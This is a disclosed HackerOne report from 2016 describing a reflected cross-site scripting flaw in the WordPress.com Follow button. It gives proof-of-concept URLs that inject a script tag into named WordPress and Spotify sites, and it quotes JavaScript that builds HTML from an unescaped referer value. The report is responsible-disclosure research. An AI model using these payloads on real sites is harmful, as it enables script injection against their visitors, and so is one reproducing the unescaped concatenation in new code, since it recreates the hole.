# Follow Button XSS

## Report Details
- **Report ID**: 172574
- **URL**: https://hackerone.com/reports/172574
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-09-28T07:06:46.944Z
- **Disclosed**: 2016-10-28T12:44:46.991Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
**PoC**
1) Open link
2) Click "Follow" in the bottom right-hand corner

XSS Should work on any wordpress site with this Follow button. 
fbd.isLoggedIn must be equal to false.

```
https://apps.wordpress.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://labs.spotify.com/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://news.spotify.com/tr/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
```

**Vulnerable Code**
apps.wordpress.com
```html
<script type='text/javascript'>
/* <![CDATA[ */
var actionbardata = {
...
"subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"9dca8606d3\" \/><input type=\"hidden\" name=\"_wp_http_referer\" 
value=\"\/support\/\"><script>alert(document.domain)<\/script>\" \/>",
"referer":"https:\/\/apps.wordpress.com\/support\/\"><script>alert(document.domain)<\/script>",
"canFollow":"1"
...
</script>
```

s2.wp.com/_static/
```js
	// Follow Site
	$actionbar.on(  'click', '.actnbr-actn-follow', function(e) {
		e.preventDefault();

		if ( fbd.isLoggedIn ) {
			showActionBarStatusMessage( '<div class="actnbr-reader">' + fbd.i18n.followedText + '</div>' );
			bumpStat( 'followed' );
			request( 'ab_subscribe_to_blog' );
		} else {
			showActionBarFollowForm();
		}
	} )
	...
		function showActionBarFollowForm() {
		var btn = $( '#actionbar .actnbr-btn' );
		btn.toggleClass( 'actnbr-hidden' );

		$( '#actionbar .actnbr-follow-bubble' ).html( ' \
			...
			<input type="hidden" name="blog_id" value="' + fbd.siteID + '"/> \
			<input type="hidden" name="source" value="' + fbd.referer + '"/> \
			<input type="hidden" name="sub-type" value="actionbar-follow"/> \
			' + fbd.subscribeNonce + ' \
			...
		');
```




## Attachments
- Screenshot_at_11-06-11.png
